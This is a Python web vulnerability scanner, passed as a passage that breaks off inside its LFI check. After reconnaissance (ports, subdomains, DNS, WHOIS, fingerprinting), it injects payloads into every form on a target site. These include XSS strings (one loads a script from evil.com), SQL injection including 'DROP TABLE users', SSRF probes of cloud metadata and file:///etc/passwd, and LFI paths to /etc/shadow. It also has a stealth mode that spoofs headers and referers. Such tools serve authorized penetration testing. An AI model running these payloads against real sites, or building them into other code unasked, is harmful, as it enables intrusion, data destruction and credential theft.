"""
by huocai
github https://www.github.com/huocai250
"""
import sys
import time
import asyncio
import aiohttp
import concurrent.futures
from urllib.parse import urlparse, urljoin
from optparse import OptionParser
from bs4 import BeautifulSoup as bs
from pprint import pprint
import socket
import logging
import json
import os
import re
from http.client import responses
import ssl
import dns.resolver
import hashlib
from typing import Dict, List, Optional, Tuple, Set
from tqdm import tqdm
import whois
import aiohttp_socks
from datetime import datetime
import random
import aiofiles
import xml.etree.ElementTree as ET
from urllib.robotparser import RobotFileParser
import aiohttp_retry
from aiohttp import ClientSession
import jwt
import base64
import traceback

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('webscanner.log')
    ]
)

class WebScanner:
    def __init__(self, url: str, timeout: int = 5, threads: int = 10, output_file: Optional[str] = None, 
                 verbose: bool = False, proxy: Optional[str] = None, rate_limit: int = 100, 
                 stealth_mode: bool = False, respect_robots: bool = True, retries: int = 3,
                 custom_wordlist: Optional[str] = None):
        self.url = self._ensure_url_scheme(url)
        self.timeout = timeout
        self.threads = threads
        self.output_file = output_file
        self.verbose = verbose
        self.proxy = proxy
        self.rate_limit = rate_limit
        self.stealth_mode = stealth_mode
        self.respect_robots = respect_robots
        self.retries = retries
        self.custom_wordlist = custom_wordlist
        self.session = aiohttp_retry.RetryClient(
            ClientSession(
                headers=self._get_random_headers() if stealth_mode else {
                    'User-Agent': 'WebScanner/9.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Connection': 'keep-alive'
                },
                connector=aiohttp_socks.ProxyConnector.from_url(proxy) if proxy else None,
                trust_env=True
            ),
            retry_options=aiohttp_retry.ExponentialRetry(attempts=retries, factor=2.0)
        )
        self.results: Dict = {
            'scan_start_time': datetime.now().isoformat(),
            'url_info': {},
            'dns_info': {},
            'whois_info': {},
            'xss_vulnerabilities': [],
            'directories': [],
            'sensitive_info': [],
            'sql_injection': [],
            'ssrf_vulnerabilities': [],
            'lfi_vulnerabilities': [],
            'rfi_vulnerabilities': [],
            'open_redirects': [],
            'ssl_info': {},
            'headers': {},
            'subdomains': [],
            'performance': {},
            'robots_txt': {},
            'sitemap': [],
            'cors_config': {},
            'http_methods': [],
            'cookies': [],
            'security_policies': {},
            'fingerprint': {}
        }
        self.common_ports: List[int] = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9000, 9200]
        self.semaphore = asyncio.Semaphore(rate_limit)
        self.checked_urls: Set[str] = set()
        self.fingerprint_db = {
            'wordpress': ['wp-content', 'wp-login.php'],
            'drupal': ['sites/default', 'drupal.js'],
            'joomla': ['administrator', 'joomla.xml'],
            'nginx': ['nginx', 'ngx_http'],
            'apache': ['apache', 'httpd'],
            'iis': ['iisstart.htm', 'Microsoft-IIS']
        }

    def _ensure_url_scheme(self, url: str) -> str:
        """确保URL包含协议"""
        if not url.startswith(('http://', 'https://')):
            return 'http://' + url
        return url

    def _get_random_headers(self) -> Dict:
        """生成随机头信息以实现隐秘扫描"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1'
        ]
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.5', 'zh-CN,zh;q=0.9', 'fr-FR,fr;q=0.8', 'de-DE,de;q=0.7']),
            'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'gzip']),
            'Connection': 'keep-alive',
            'Referer': random.choice(['https://www.google.com/', 'https://www.bing.com/', self.url, 'https://duckduckgo.com/']),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1'
        }

    async def _save_results(self) -> None:
        """异步保存扫描结果到文件"""
        if self.output_file:
            try:
                self.results['scan_end_time'] = datetime.now().isoformat()
                async with aiofiles.open(self.output_file, 'w', encoding='utf-8') as f:
                    await f.write(json.dumps(self.results, indent=2, ensure_ascii=False))
                logging.info(f"结果已保存到 {self.output_file}")
            except Exception as e:
                logging.error(f"保存结果失败: {e}")

    async def parse_url(self) -> bool:
        """获取URL基本信息及元数据"""
        try:
            start_time = time.time()
            url_info = urlparse(self.url)
            hostname = url_info.hostname
            protocol = url_info.scheme
            ip = await asyncio.to_thread(socket.gethostbyname, hostname)
            port = url_info.port or (443 if protocol == 'https' else 80)
            
            open_ports = await self._scan_ports(ip)
            headers, cookies = await self._analyze_headers()
            ssl_info = await self._check_ssl() if protocol == 'https' else {}
            dns_info = await self._get_dns_info(hostname)
            whois_info = await self._get_whois_info(hostname)
            subdomains = await self._enumerate_subdomains(hostname)
            robots_info, sitemap_urls = await self._parse_robots_txt()
            cors_config = await self._check_cors()
            http_methods = await self._check_http_methods()
            fingerprint = await self._fingerprint_server()
            
            self.results['url_info'] = {
                'hostname': hostname,
                'protocol': protocol,
                'ip': ip,
                'port': port,
                'open_ports': open_ports,
                'waf_detected': False
            }
            self.results['headers'] = headers
            self.results['cookies'] = cookies
            self.results['ssl_info'] = ssl_info
            self.results['dns_info'] = dns_info
            self.results['whois_info'] = whois_info
            self.results['subdomains'] = subdomains
            self.results['robots_txt'] = robots_info
            self.results['sitemap'] = sitemap_urls
            self.results['cors_config'] = cors_config
            self.results['http_methods'] = http_methods
            self.results['fingerprint'] = fingerprint
            
            logging.info("-" * 20 + "[*] URL基本检测加载中..." + "-" * 20)
            logging.info(f"[+] 域名: {hostname}")
            logging.info(f"[+] 协议: {protocol}")
            logging.info(f"[+] IP地址: {ip}")
            logging.info(f"[+] 默认端口: {port}")
            if open_ports:
                logging.info(f"[+] 开放端口: {', '.join(map(str, open_ports))}")
            if self.verbose:
                if headers:
                    logging.info("[+] HTTP头信息:")
                    for k, v in headers.items():
                        logging.info(f"    {k}: {v}")
                if cookies:
                    logging.info("[+] Cookies:")
                    for cookie in cookies:
                        logging.info(f"    {cookie['name']}: {cookie['value']} (Secure: {cookie.get('secure', False)})")
                if ssl_info:
                    logging.info(f"[+] SSL信息: {ssl_info}")
                if dns_info:
                    logging.info(f"[+] DNS记录: {dns_info}")
                if whois_info:
                    logging.info(f"[+] WHOIS信息: {whois_info}")
                if subdomains:
                    logging.info(f"[+] 发现子域名: {', '.join([s['subdomain'] for s in subdomains])}")
                if robots_info:
                    logging.info(f"[+] Robots.txt规则: {robots_info}")
                if sitemap_urls:
                    logging.info(f"[+] Sitemap URL: {', '.join(sitemap_urls[:5])}" + 
                               (f" 等共{len(sitemap_urls)}项" if len(sitemap_urls) > 5 else ""))
                if cors_config:
                    logging.info(f"[+] CORS配置: {cors_config}")
                if http_methods:
                    logging.info(f"[+] 支持的HTTP方法: {', '.join(http_methods)}")
                if fingerprint:
                    logging.info(f"[+] 服务器指纹: {fingerprint}")
            self.results['performance']['url_parse'] = time.time() - start_time
            return True
        except Exception as e:
            logging.error(f"URL解析失败: {e}")
            return False

    async def _scan_ports(self, ip: str) -> List[int]:
        """异步扫描常用端口"""
        async def check_port(port: int) -> Optional[int]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = await asyncio.to_thread(sock.connect_ex, (ip, port))
                sock.close()
                if result == 0:
                    service = socket.getservbyport(port, 'tcp') if port in [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9000, 9200] else 'unknown'
                    return {'port': port, 'service': service}
                return None
            except:
                return None

        tasks = [check_port(port) for port in self.common_ports]
        open_ports = [port for port in await asyncio.gather(*tasks) if port is not None]
        return open_ports

    async def _analyze_headers(self) -> Tuple[Dict, List[Dict]]:
        """分析HTTP响应头并提取Cookie"""
        async with self.semaphore:
            try:
                async with self.session.get(self.url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    headers = dict(response.headers)
                    cookies = []
                    for cookie in response.cookies:
                        cookie_info = {
                            'name': cookie.key,
                            'value': cookie.value,
                            'secure': cookie.get('secure', False),
                            'httponly': cookie.get('httponly', False),
                            'domain': cookie.get('domain', ''),
                            'path': cookie.get('path', '/'),
                            'expires': cookie.get('expires', None)
                        }
                        cookies.append(cookie_info)
                        if self.verbose and not cookie_info['secure']:
                            logging.warning(f"[!] Cookie {cookie_info['name']} 未设置Secure属性")
                        if self.verbose and not cookie_info['httponly']:
                            logging.warning(f"[!] Cookie {cookie_info['name']} 未设置HttpOnly属性")
                    
                    security_headers = {
                        'X-Frame-Options': headers.get('X-Frame-Options'),
                        'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                        'Content-Security-Policy': headers.get('Content-Security-Policy'),
                        'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                        'X-XSS-Protection': headers.get('X-XSS-Protection'),
                        'Referrer-Policy': headers.get('Referrer-Policy'),
                        'Permissions-Policy': headers.get('Permissions-Policy')
                    }
                    missing = [k for k, v in security_headers.items() if not v]
                    if self.verbose and missing:
                        logging.warning(f"[!] 缺少安全头: {', '.join(missing)}")
                    if 'Server' in headers and self.verbose:
                        logging.info(f"[+] 服务器类型: {headers['Server']}")
                    return headers, cookies
            except:
                return {}, []

    async def _check_ssl(self) -> Dict:
        """检查SSL/TLS信息并评估安全性"""
        try:
            hostname = urlparse(self.url).hostname
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info = {
                        'version': ssock.version(),
                        'cipher': ssock.cipher()[0],
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'notBefore': cert.get('notBefore'),
                        'notAfter': cert.get('notAfter'),
                        'serialNumber': cert.get('serialNumber'),
                        'expired': datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z') < datetime.now(),
                        'weak_ciphers': ssock.cipher()[0] in ['RC4', 'DES', '3DES', 'MD5', 'SHA1'],
                        'certificate_chain': [dict(x[0] for x in c) for c in cert.get('issuerCertificate', [])],
                        'tls_protocols': await self._check_tls_protocols(hostname)
                    }
                    if ssl_info['expired']:
                        logging.warning("[!] SSL证书已过期")
                    if ssl_info['version'] in ['SSLv3', 'TLSv1.0', 'TLSv1.1']:
                        logging.warning(f"[!] 使用不安全的SSL版本: {ssl_info['version']}")
                    if ssl_info['weak_ciphers']:
                        logging.warning(f"[!] 使用弱加密算法: {ssl_info['cipher']}")
                    if not ssl_info['tls_protocols'].get('TLSv1.3', False) and self.verbose:
                        logging.info("[+] 未启用TLSv1.3")
                    return ssl_info
        except Exception as e:
            logging.warning(f"SSL检查失败: {e}")
            return {}

    async def _check_tls_protocols(self, hostname: str) -> Dict:
        """检查支持的TLS协议版本"""
        protocols = ['SSLv3', 'TLSv1.0', 'TLSv1.1', 'TLSv1.2', 'TLSv1.3']
        supported = {}
        
        async def test_protocol(proto: str) -> Tuple[str, bool]:
            try:
                context = ssl.SSLContext(getattr(ssl, f'PROTOCOL_{proto.replace(".", "_")}'))
                context.set_ciphers('DEFAULT')
                with socket.create_connection((hostname, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname):
                        return proto, True
            except:
                return proto, False

        tasks = [test_protocol(proto) for proto in protocols]
        results = await asyncio.gather(*tasks)
        supported = dict(results)
        return supported

    async def _get_dns_info(self, hostname: str) -> Dict:
        """获取DNS记录"""
        dns_records = {}
        for record_type in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'SRV', 'CAA']:
            try:
                answers = await asyncio.to_thread(dns.resolver.resolve, hostname, record_type)
                dns_records[record_type] = [str(rdata) for rdata in answers]
            except:
                pass
        if 'CAA' in dns_records and self.verbose:
            logging.info(f"[+] CAA记录: {dns_records['CAA']}")
        return dns_records

    async def _get_whois_info(self, domain: str) -> Dict:
        """获取WHOIS信息"""
        try:
            w = await asyncio.to_thread(whois.whois, domain)
            whois_info = {
                'registrar': w.registrar,
                'creation_date': str(w.creation_date) if w.creation_date else None,
                'expiration_date': str(w.expiration_date) if w.expiration_date else None,
                'name_servers': w.name_servers,
                'registrant': w.registrant if hasattr(w, 'registrant') else None,
                'status': w.status if hasattr(w, 'status') else None,
                'emails': w.emails if hasattr(w, 'emails') else None
            }
            if whois_info['expiration_date'] and datetime.strptime(whois_info['expiration_date'], '%Y-%m-%d %H:%M:%S') < datetime.now() and self.verbose:
                logging.warning("[!] 域名已过期")
            return whois_info
        except Exception as e:
            logging.warning(f"WHOIS查询失败: {e}")
            return {}

    async def _enumerate_subdomains(self, hostname: str) -> List[Dict]:
        """子域名枚举（增强版）"""
        common_subs = ['www', 'mail', 'ftp', 'test', 'dev', 'admin', 'api', 'staging', 'blog', 'shop', 
                      'secure', 'vpn', 'login', 'portal', 'cdn', 'dashboard', 'webmail', 'support', 'auth']
        if self.custom_wordlist:
            try:
                with open(self.custom_wordlist, 'r', encoding='utf-8') as f:
                    common_subs.extend([line.strip() for line in f if line.strip()])
            except:
                logging.warning(f"无法加载自定义子域名字典: {self.custom_wordlist}")
        subdomains = []

        async def check_subdomain(sub: str) -> Optional[Dict]:
            subdomain = f"{sub}.{hostname}"
            try:
                ip = await asyncio.to_thread(socket.gethostbyname, subdomain)
                sub_info = {'subdomain': subdomain, 'ip': ip}
                status = await self._check_subdomain_status(subdomain)
                sub_info['status'] = status
                if status == 200:
                    ssl_info = await self._check_ssl_subdomain(subdomain)
                    if ssl_info:
                        self.results['ssl_info'][subdomain] = ssl_info
                return sub_info
            except:
                return None

        tasks = [check_subdomain(sub) for sub in common_subs]
        subdomains = [sub for sub in await asyncio.gather(*tasks) if sub]
        return subdomains

    async def _check_ssl_subdomain(self, hostname: str) -> Optional[Dict]:
        """检查子域名的SSL信息"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'version': ssock.version(),
                        'cipher': ssock.cipher()[0],
                        'notAfter': cert.get('notAfter'),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'subjectAltName': cert.get('subjectAltName', [])
                    }
        except:
            return None

    async def _check_subdomain_status(self, subdomain: str) -> Optional[int]:
        """检查子域名HTTP状态"""
        try:
            async with self.semaphore:
                async with self.session.head(f"https://{subdomain}", timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    return response.status
        except:
            try:
                async with self.semaphore:
                    async with self.session.head(f"http://{subdomain}", timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                        return response.status
            except:
                return None

    async def _parse_robots_txt(self) -> Tuple[Dict, List[str]]:
        """解析robots.txt并提取sitemap"""
        robots_url = urljoin(self.url, '/robots.txt')
        robots_info = {}
        sitemap_urls = []
        
        try:
            async with self.semaphore:
                async with self.session.get(robots_url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    if response.status == 200:
                        content = await response.text()
                        rp = RobotFileParser()
                        rp.parse(content.splitlines())
                        robots_info = {
                            'disallowed': [rule.path for rule in rp.entries[0].rulelines if not rule.allowance] if rp.entries else [],
                            'allowed': [rule.path for rule in rp.entries[0].rulelines if rule.allowance] if rp.entries else [],
                            'crawl_delay': rp.crawl_delay('*'),
                            'user_agents': [entry.useragent for entry in rp.entries],
                            'host': rp.host if hasattr(rp, 'host') else None
                        }
                        sitemap_urls = re.findall(r'Sitemap:\s*(.+)', content, re.I)
                        for sitemap in sitemap_urls[:5]:
                            await self._parse_sitemap(sitemap)
        except Exception as e:
            logging.warning(f"无法解析robots.txt: {e}")
        
        return robots_info, sitemap_urls

    async def _parse_sitemap(self, sitemap_url: str) -> None:
        """解析Sitemap文件"""
        try:
            async with self.semaphore:
                async with self.session.get(sitemap_url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    if response.status == 200:
                        content = await response.text()
                        root = ET.fromstring(content)
                        urls = [elem.text for elem in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}loc')]
                        priorities = {elem.text: float(elem.find('{http://www.sitemaps.org/schemas/sitemap/0.9}priority').text) 
                                    for elem in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}url')
                                    if elem.find('{http://www.sitemaps.org/schemas/sitemap/0.9}priority') is not None}
                        self.results['sitemap'].extend([{'url': url, 'priority': priorities.get(url, 0.5)} for url in urls[:300]])
                        if self.verbose and len(urls) > 300:
                            logging.info(f"[+] Sitemap包含 {len(urls)} 个URL，仅记录前300个")
        except Exception as e:
            logging.warning(f"无法解析Sitemap {sitemap_url}: {e}")

    async def _check_cors(self) -> Dict:
        """检查CORS配置"""
        try:
            async with self.semaphore:
                async with self.session.options(self.url, headers={'Origin': 'http://example.com'}, 
                                              timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    cors_headers = {
                        'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                        'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods'),
                        'Access-Control-Allow-Headers': response.headers.get('Access-Control-Allow-Headers'),
                        'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
                        'Access-Control-Expose-Headers': response.headers.get('Access-Control-Expose-Headers')
                    }
                    if cors_headers['Access-Control-Allow-Origin'] == '*' and self.verbose:
                        logging.warning("[!] CORS配置允许所有来源，可能存在安全风险")
                    if cors_headers['Access-Control-Allow-Credentials'] == 'true' and cors_headers['Access-Control-Allow-Origin'] == '*' and self.verbose:
                        logging.warning("[!] CORS允许凭据且来源为*，可能导致凭据泄露")
                    return {k: v for k, v in cors_headers.items() if v}
        except:
            return {}

    async def _check_http_methods(self) -> List[str]:
        """检查支持的HTTP方法"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'HEAD', 'PATCH', 'CONNECT']
        supported = []
        
        async def test_method(method: str) -> Optional[str]:
            try:
                async with self.semaphore:
                    async with self.session.request(method, self.url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                        if response.status not in [405, 501]:
                            return method
            except:
                pass
            return None

        tasks = [test_method(method) for method in methods]
        supported = [m for m in await asyncio.gather(*tasks) if m]
        if 'TRACE' in supported and self.verbose:
            logging.warning("[!] 支持TRACE方法，可能存在XST风险")
        if 'CONNECT' in supported and self.verbose:
            logging.warning("[!] 支持CONNECT方法，可能被用作代理")
        return supported

    async def _fingerprint_server(self) -> Dict:
        """服务器指纹识别"""
        try:
            async with self.semaphore:
                async with self.session.get(self.url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    content = await response.text()
                    headers = dict(response.headers)
                    fingerprint = {}
                    for tech, indicators in self.fingerprint_db.items():
                        if any(ind in content.lower() for ind in indicators) or \
                           any(ind in headers.get('Server', '').lower() for ind in indicators):
                            fingerprint[tech] = {'detected': True, 'confidence': 0.9}
                        elif any(ind in str(headers).lower() for ind in indicators):
                            fingerprint[tech] = {'detected': True, 'confidence': 0.6}
                    return fingerprint
        except:
            return {}

    async def _async_get(self, url: str) -> Tuple[str, Optional[str]]:
        """异步HTTP请求"""
        if url in self.checked_urls or (self.respect_robots and not await self._is_allowed_by_robots(url)):
            return url, None
        async with self.semaphore:
            try:
                async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    self.checked_urls.add(url)
                    return url, await response.text()
            except:
                return url, None

    async def _is_allowed_by_robots(self, url: str) -> bool:
        """检查URL是否被robots.txt允许"""
        rp = RobotFileParser()
        rp.parse('\n'.join([f"Disallow: {path}" for path in self.results['robots_txt'].get('disallowed', [])]).splitlines())
        return rp.can_fetch('*', url)

    async def get_all_forms(self) -> Tuple[List, str]:
        """异步获取页面所有表单"""
        url, content = await self._async_get(self.url)
        if content:
            soup = bs(content, "html.parser")
            return soup.find_all("form"), content
        return [], ""

    async def scan_xss(self) -> bool:
        """扫描XSS漏洞"""
        start_time = time.time()
        logging.info("-" * 20 + "[*] XSS检测加载中..." + "-" * 20)
        forms, page_content = await self.get_all_forms()
        logging.info(f"[+] 在 {self.url} 上检测到 {len(forms)} 个表单")
        
        payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "'><script>alert('xss')</script>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src=javascript:alert('xss')>",
            "<input type=\"text\" value=\"\"><script>alert('xss')</script>",
            "<body onload=alert('xss')>",
            "<script src=\"http://evil.com/xss.js\"></script>",
            "<a href=\"javascript:alert('xss')\">click</a>",
            "<div style=\"background:url(javascript:alert('xss'))\">test</div>",
            "<object data=\"javascript:alert('xss')\"></object>",
            "<video><source onerror=\"alert('xss')\"></video>"
        ]
        
        await self._scan_sensitive_info(page_content)
        
        async def test_payload(form_details: Dict, payload: str) -> Optional[Dict]:
            response = await self._async_submit_form(form_details, payload)
            if response:
                content = await response.text()
                headers = dict(response.headers)
                if payload in content or payload in str(headers):
                    return {
                        'url': str(response.url),
                        'payload': payload,
                        'form_details': form_details if self.verbose else None,
                        'hash': hashlib.md5(content.encode()).hexdigest(),
                        'reflected_in': 'body' if payload in content else 'headers',
                        'response_snippet': content[:200] if self.verbose and payload in content else None
                    }
            return None

        tasks = []
        for form in forms:
            form_details = self.get_form_details(form)
            for payload in payloads:
                tasks.append(test_payload(form_details, payload))
        
        results = await asyncio.gather(*tasks)
        for vuln in [r for r in results if r]:
            self.results['xss_vulnerabilities'].append(vuln)
            logging.info(f"[+] 在 {vuln['url']} 检测到XSS漏洞")
            logging.info(f"[*] 使用payload: {vuln['payload']}")
            if self.verbose:
                logging.info(f"[*] 反射位置: {vuln['reflected_in']}")
                logging.info("[*] 表单详情:")
                pprint(vuln['form_details'])
                if vuln['response_snippet']:
                    logging.info(f"[*] 响应片段: {vuln['response_snippet']}")

        self.results['performance']['xss_scan'] = time.time() - start_time
        return bool(self.results['xss_vulnerabilities'])

    def get_form_details(self, form) -> Dict:
        """解析表单详情"""
        details = {
            "action": form.attrs.get("action", "").lower(),
            "method": form.attrs.get("method", "get").lower(),
            "inputs": [],
            "enctype": form.attrs.get("enctype", "application/x-www-form-urlencoded"),
            "id": form.attrs.get("id", ""),
            "class": form.attrs.get("class", [])
        }
        for input_tag in form.find_all(["input", "textarea", "select", "button"]):
            input_type = input_tag.attrs.get("type", input_tag.name)
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            details["inputs"].append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
                "required": input_tag.attrs.get("required", False),
                "placeholder": input_tag.attrs.get("placeholder", ""),
                "id": input_tag.attrs.get("id", ""),
                "autocomplete": input_tag.attrs.get("autocomplete", "on")
            })
        return details

    async def _async_submit_form(self, form_details: Dict, value: str) -> Optional[aiohttp.ClientResponse]:
        """异步提交表单"""
        target_url = urljoin(self.url, form_details["action"])
        if target_url in self.checked_urls or (self.respect_robots and not await self._is_allowed_by_robots(target_url)):
            return None
        data = {}
        for input_field in form_details["inputs"]:
            if input_field["type"] in ["text", "search", "textarea", "email", "password"]:
                data[input_field["name"]] = value
            elif input_field["name"]:
                data[input_field["name"]] = input_field["value"]

        async with self.semaphore:
            try:
                if form_details["method"].lower() == "post":
                    if form_details["enctype"] == "application/json":
                        headers = {'Content-Type': 'application/json'}
                        async with self.session.post(target_url, json=data, headers=headers, 
                                                   timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                            self.checked_urls.add(target_url)
                            return response
                    async with self.session.post(target_url, data=data, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                        self.checked_urls.add(target_url)
                        return response
                async with self.session.get(target_url, params=data, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    self.checked_urls.add(target_url)
                    return response
            except:
                return None

    async def scan_sql_injection(self) -> bool:
        """扫描SQL注入漏洞"""
        start_time = time.time()
        logging.info("-" * 20 + "[*] SQL注入检测加载中..." + "-" * 20)
        forms, _ = await self.get_all_forms()
        logging.info(f"[+] 在 {self.url} 上检测到 {len(forms)} 个表单")
        
        sql_payloads = [
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, username, password FROM users --",
            "1' AND SLEEP(5) --",
            "' OR '1'='1",
            "1; WAITFOR DELAY '0:0:5' --",
            "' OR EXISTS(SELECT * FROM users WHERE 1=1) --",
            "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
            "' AND SUBSTRING((SELECT database()), 1, 1) = 'a' --",
            "1' ORDER BY 9999 --"
        ]
        error_patterns = [
            r"mysql_fetch",
            r"sql syntax",
            r"unclosed quotation",
            r"server error",
            r"incorrect syntax",
            r"ODBC SQL Server Driver",
            r"sqlite3",
            r"ORA-[0-9]{4}",
            r"unknown column",
            r"order by"
        ]
        
        async def test_sql_payload(form_details: Dict, payload: str) -> Optional[Dict]:
            start_time = time.time()
            response = await self._async_submit_form(form_details, payload)
            if response:
                content = await response.text()
                elapsed = time.time() - start_time
                error_detected = any(re.search(pattern, content, re.I) for pattern in error_patterns)
                time_based = elapsed > 4 and ("SLEEP" in payload or "WAITFOR" in payload)
                if error_detected or time_based:
                    return {
                        'url': str(response.url),
                        'payload': payload,
                        'form_details': form_details if self.verbose else None,
                        'response_time': elapsed if time_based else None,
                        'error_detected': error_detected,
                        'response_snippet': content[:200] if self.verbose and error_detected else None,
                        'status_code': response.status
                    }
            return None

        tasks = []
        for form in forms:
            form_details = self.get_form_details(form)
            for payload in sql_payloads:
                tasks.append(test_sql_payload(form_details, payload))
        
        results = await asyncio.gather(*tasks)
        for vuln in [r for r in results if r]:
            self.results['sql_injection'].append(vuln)
            logging.info(f"[+] 在 {vuln['url']} 检测到SQL注入漏洞")
            logging.info(f"[*] 使用payload: {vuln['payload']}")
            if self.verbose:
                logging.info(f"[*] 状态码: {vuln['status_code']}")
                logging.info("[*] 表单详情:")
                pprint(vuln['form_details'])
                if vuln['response_time']:
                    logging.info(f"[*] 响应延迟: {vuln['response_time']:.2f}秒")
                if vuln['error_detected']:
                    logging.info(f"[*] 错误响应片段: {vuln['response_snippet']}")

        self.results['performance']['sql_scan'] = time.time() - start_time
        return bool(self.results['sql_injection'])

    async def scan_ssrf(self) -> bool:
        """扫描服务器端请求伪造（SSRF）漏洞"""
        start_time = time.time()
        logging.info("-" * 20 + "[*] SSRF检测加载中..." + "-" * 20)
        forms, _ = await self.get_all_forms()
        logging.info(f"[+] 在 {self.url} 上检测到 {len(forms)} 个表单")
        
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:80/",
            "http://127.0.0.1:8080/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:3306/_%00%01",
            "http://burpcollaborator.net/",
            "http://[::1]/",
            "dict://127.0.0.1:6379/info",
            "http://metadata.google.internal/computeMetadata/v1/",
            "ftp://127.0.0.1:21/"
        ]
        ssrf_indicators = [
            r"Amazon EC2",
            r"root:.*:0:0:",
            r"connection refused",
            r"mysql",
            r"redis_version",
            r"localhost",
            r"Google Compute",
            r"220 FTP"
        ]
        
        async def test_ssrf_payload(form_details: Dict, payload: str) -> Optional[Dict]:
            response = await self._async_submit_form(form_details, payload)
            if response:
                content = await response.text()
                headers = dict(response.headers)
                if any(re.search(indicator, content, re.I) for indicator in ssrf_indicators) or \
                   any('localhost' in str(v).lower() or '127.0.0.1' in str(v).lower() for v in headers.values()):
                    return {
                        'url': str(response.url),
                        'payload': payload,
                        'form_details': form_details if self.verbose else None,
                        'response_snippet': content[:200] if self.verbose else None,
                        'headers': headers if self.verbose else None,
                        'status_code': response.status
                    }
            return None

        tasks = []
        for form in forms:
            form_details = self.get_form_details(form)
            for payload in ssrf_payloads:
                tasks.append(test_ssrf_payload(form_details, payload))
        
        results = await asyncio.gather(*tasks)
        for vuln in [r for r in results if r]:
            self.results['ssrf_vulnerabilities'].append(vuln)
            logging.info(f"[+] 在 {vuln['url']} 检测到SSRF漏洞")
            logging.info(f"[*] 使用payload: {vuln['payload']}")
            if self.verbose:
                logging.info(f"[*] 状态码: {vuln['status_code']}")
                logging.info("[*] 表单详情:")
                pprint(vuln['form_details'])
                logging.info(f"[*] 响应片段: {vuln['response_snippet']}")
                logging.info(f"[*] 响应头: {vuln['headers']}")

        self.results['performance']['ssrf_scan'] = time.time() - start_time
        return bool(self.results['ssrf_vulnerabilities'])

    async def scan_lfi(self) -> bool:
        """扫描本地文件包含（LFI）漏洞"""
        start_time = time.time()
        logging.info("-" * 20 + "[*] LFI检测加载中..." + "-" * 20)
        forms, _ = await self.get_all_forms()
        logging.info(f"[+] 在 {self.url} 上检测到 {len(forms)} 个表单")
        
        lfi_payloads = [
            "../../etc/passwd",
            "/etc/passwd",
            "../windows/win.ini",
            "....//....//etc/passwd",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
            "/var/log/apache2/access.log",
            "../../../../../../../../etc/shadow"
        ]
        lfi_indicators = [
            r"root:.*:0:0:",
            r"\[extensions\]",
            r"USER=.*HTTP_USER_AGENT",
            r"base64",
            r"daemon:.*:",
            r"GET /"
        ]
        
        async def test_lfi_payload(form_details: Dict, payload: str) -> Optional[Dict]:
            response = await self._async_submit_form(form_details, payload)
            if response:
